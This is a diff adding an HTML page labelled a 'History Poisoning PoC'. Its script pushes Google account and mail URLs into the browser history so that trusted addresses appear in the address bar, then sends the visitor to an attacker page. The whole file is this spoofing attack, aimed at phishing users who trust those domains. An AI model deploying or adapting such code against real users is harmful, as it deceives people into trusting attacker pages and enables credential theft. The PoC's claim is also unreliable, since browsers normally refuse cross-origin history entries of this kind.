@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html>
+<body style="font-size:22px">
+
+<h2>History Poisoning PoC</h2>
+<p>When the button is clicked, a trusted URL will appear in the address bar without loading it.</p>
+
+<button onclick="poison()">Start History Spoof</button>
+
+<script>
+function poison() {
+    // STEP 1: Add fake trusted entries to history without loading them
+    history.pushState({}, "", "https://accounts.google.com/");
+    history.pushState({}, "", "https://mail.google.com/");
+
+    // STEP 2: Replace current entry with attacker page (still same tab)
+    history.replaceState({}, "", "atti.html");
+
+    // STEP 3: Show attacker content
+    window.location.href = "atti.html";
+}
+</script>
+
+</body>
+</html>
